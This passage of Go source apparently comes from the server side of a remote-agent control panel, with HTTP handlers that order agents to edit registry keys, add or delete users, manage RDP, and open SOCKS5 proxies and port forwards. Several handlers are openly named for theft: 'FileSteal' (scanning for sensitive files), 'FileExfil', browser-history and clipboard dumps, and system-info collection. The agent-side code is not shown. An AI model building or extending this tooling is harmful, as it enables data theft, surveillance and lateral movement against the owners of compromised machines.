	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供注册表参数"})
		return
	}
	result, err := h.agentHub.RegWrite(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// RegDelete 删除远程注册表键值
func (h *ExecHandler) RegDelete(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供注册表参数"})
		return
	}
	result, err := h.agentHub.RegDelete(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// UserListRemote 获取远程用户列表
func (h *ExecHandler) UserListRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.UserList(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// UserAddRemote 在远程添加用户
func (h *ExecHandler) UserAddRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供用户参数"})
		return
	}
	result, err := h.agentHub.UserAdd(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// UserDeleteRemote 在远程删除用户
func (h *ExecHandler) UserDeleteRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供用户参数"})
		return
	}
	result, err := h.agentHub.UserDelete(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// RdpManage RDP 管理（启用/禁用/改端口/查状态）
func (h *ExecHandler) RdpManage(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供 RDP 参数"})
		return
	}
	result, err := h.agentHub.RdpManage(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// NetstatRemote 获取远程网络连接状态（附加 IP 归属地查询）
func (h *ExecHandler) NetstatRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.Netstat(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	// 服务端 QQwry IP 归属地增强
	dataDir := filepath.Join(filepath.Dir(os.Args[0]), "data")
	qqwry := service.GetQQwry(dataDir)
	if qqwry.IsLoaded() {
		result = enrichNetstatWithGeo(result, qqwry)
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// enrichNetstatWithGeo 为 netstat 结果的每个 TCP 条目增加 location 字段
func enrichNetstatWithGeo(raw string, qqwry *service.QQwry) string {
	var data struct {
		TCP []map[string]interface{} `json:"tcp"`
		UDP []map[string]interface{} `json:"udp"`
	}
	if err := json.Unmarshal([]byte(raw), &data); err != nil {
		return raw
	}

	for _, entry := range data.TCP {
		if remote, ok := entry["remote"].(string); ok {
			// remote 格式: "1.2.3.4:80"
			ip := remote
			if idx := lastIndexByte(ip, ':'); idx > 0 {
				ip = ip[:idx]
			}
			loc := qqwry.Lookup(ip)
			if loc != "" {
				entry["location"] = loc
			}
		}
	}

	enriched, err := json.Marshal(data)
	if err != nil {
		return raw
	}
	return string(enriched)
}

func lastIndexByte(s string, c byte) int {
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] == c {
			return i
		}
	}
	return -1
}

// SoftwareListRemote 获取远程已安装软件列表
func (h *ExecHandler) SoftwareListRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.SoftwareList(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileStealRemote 扫描远程敏感文件
func (h *ExecHandler) FileStealRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte("{}")
	}
	result, err := h.agentHub.FileSteal(server.ID, params, 120*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileExfilRemote 提取远程文件
func (h *ExecHandler) FileExfilRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供文件路径"})
		return
	}
	result, err := h.agentHub.FileExfil(server.ID, params, 300*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// BrowserHistoryRemote 获取远程浏览器历史
func (h *ExecHandler) BrowserHistoryRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.BrowserHistory(server.ID, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ClipboardDumpRemote 获取远程剪贴板
func (h *ExecHandler) ClipboardDumpRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.ClipboardDump(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// InfoDumpRemote 收集远程系统信息
func (h *ExecHandler) InfoDumpRemote(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.InfoDump(server.ID, 60*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// HandleAgentWS 处理 Agent WebSocket 连接（通过 token 认证）
func (h *ExecHandler) HandleAgentWS(c *gin.Context) {
	token := c.Query("token")
	if token == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "缺少 token"})
		return
	}

	var server model.Server
	if err := h.db.Where("agent_token = ? AND is_active = ?", token, true).First(&server).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "无效的 Agent Token"})
		return
	}

	ws.HandleAgentWebSocket(h.agentHub, c.Writer, c.Request, server.ID, server.OSType)
}

// ── SOCKS5 代理 ──

func (h *ExecHandler) SocksProxyStart(c *gin.Context) {
	serverID := c.Param("id")
	var req struct {
		Port     int    `json:"port"`
		AuthUser string `json:"authUser"`
		AuthPass string `json:"authPass"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Port <= 0 || req.Port > 65535 {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供有效端口号(1-65535)"})
		return
	}
	if !h.agentHub.IsAgentOnline(serverID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	proxy := h.agentHub.GetSocksProxy()
	if proxy == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": "SOCKS 代理未初始化"})
		return
	}
	port, err := proxy.Start(serverID, req.Port, req.AuthUser, req.AuthPass)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"success": true, "port": port})
}

func (h *ExecHandler) SocksProxyStop(c *gin.Context) {
	serverID := c.Param("id")
	proxy := h.agentHub.GetSocksProxy()
	if proxy != nil {
		proxy.Stop(serverID)
	}
	c.JSON(200, gin.H{"success": true})
}

func (h *ExecHandler) SocksProxyStatus(c *gin.Context) {
	serverID := c.Param("id")
	proxy := h.agentHub.GetSocksProxy()
	if proxy == nil {
		c.JSON(200, gin.H{"success": true, "data": ws.SocksProxyStatus{}})
		return
	}
	c.JSON(200, gin.H{"success": true, "data": proxy.Status(serverID)})
}

// ── 端口转发 ──

func (h *ExecHandler) PortForwardStart(c *gin.Context) {
	serverID := c.Param("id")
	var req struct {
		LocalPort  int    `json:"localPort"`
		RemoteHost string `json:"remoteHost"`
		RemotePort int    `json:"remotePort"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.LocalPort <= 0 || req.RemotePort <= 0 || req.RemoteHost == "" {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供 localPort, remoteHost, remotePort"})
		return
	}
	if !h.agentHub.IsAgentOnline(serverID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	proxy := h.agentHub.GetSocksProxy()
	if proxy == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": "代理未初始化"})
		return
	}
	port, err := proxy.StartPortForward(serverID, req.LocalPort, req.RemoteHost, req.RemotePort)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"success": true, "port": port})
}

func (h *ExecHandler) PortForwardStop(c *gin.Context) {
	serverID := c.Param("id")
	var req struct {
		LocalPort int `json:"localPort"`
	}
	c.ShouldBindJSON(&req)
	proxy := h.agentHub.GetSocksProxy()
	if proxy != nil {
		proxy.StopPortForward(serverID, req.LocalPort)
	}
	c.JSON(200, gin.H{"success": true})
}

func (h *ExecHandler) PortForwardList(c *gin.Context) {
	serverID := c.Param("id")
	proxy := h.agentHub.GetSocksProxy()
	if proxy == nil {
		c.JSON(200, gin.H{"success": true, "data": []interface{}{}})
		return
	}
	c.JSON(200, gin.H{"success": true, "data": proxy.ListPortForwards(serverID)})
}
